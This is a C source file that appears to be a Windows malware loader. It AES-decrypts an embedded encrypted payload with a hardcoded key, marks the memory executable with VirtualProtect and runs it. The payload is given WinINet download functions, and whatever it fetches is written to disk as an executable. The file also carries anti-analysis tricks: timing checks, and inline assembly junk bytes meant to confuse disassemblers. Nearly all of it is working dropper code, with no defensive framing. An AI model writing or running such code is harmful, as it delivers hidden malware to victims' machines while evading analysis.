#include "loader.h"
#include "payload_enc.c"
extern void setTrapFlag(void);

#define TOMFOOLERY asm volatile(\
        "call appendByte2Rip\n\t"\
        ".byte 0x9a\n\t"\
    );

#define RECORD_TIME asm volatile(\
        "call pushTime\n\t"\
        ".byte 0x9a\n\t"\
);

#define CHECK_TIME asm volatile(\
        "call loadTime\n\t"\
        ".byte 0x9a\n\t"\
);


void DBGLG(char buf[], ...){
    #ifdef DEBUG
    va_list args;
    int num = 0;
    for(int i = 0; buf[i] != '\0'; ++i){
        num += buf[i] == ':';
    }
    va_start(args, buf);
    if (!num) printf("%s",buf);
    else printf("%s%d\n",buf, va_arg(args, int));

    va_end(args);
    #endif
}

/*
    args = {
        InternetOpen,
        InternetOpenUrlA,
        InternetReadFile,
        InternetCloseHandle,
        fwrite,
        FILE*,
    }
*/
typedef void (*payload)(unsigned long long*);

int main(){
    // TOMFOOLERY
    RECORD_TIME
    unsigned char MasterKey[16];
    for (int i = 0; i< 16; ++i){
        MasterKey[i] = i*16 + i;
    }
    unsigned char KeyList[176];
    int sz = 0;
    PDWORD junk = malloc(sizeof(PDWORD));
    unsigned char execute_me[sizeof(payload_enc_bytes)];
    unsigned char* buf = malloc(60 * 1024 * sizeof(unsigned char));
    FILE* file = fopen("./test.exe", "w");
    // unsigned long long args[6] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, fwrite, file};
    unsigned long long args[] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, buf, &sz};
    // unsigned long long args[] = {URLDownloadToFile, path};
    // printf("%d\n",payload_ex(args));
    payload p;
    memcpy(execute_me, payload_enc_bytes, sizeof(payload_enc_bytes));
    KeyScheduler(MasterKey, KeyList);
    for (int i = 0; i < sizeof(payload_enc_bytes); i += 16){
        Decrypt(execute_me + i, KeyList);
    }
    VirtualProtect(execute_me, sizeof(payload_enc_bytes), PAGE_EXECUTE_READWRITE, junk);
    p = (payload)(execute_me);
    CHECK_TIME
    p(args);
    fwrite(buf, 1, sz, file);
    fclose(file);
    DBGLG("Exit?\n");
    // payload();
    return 0;
}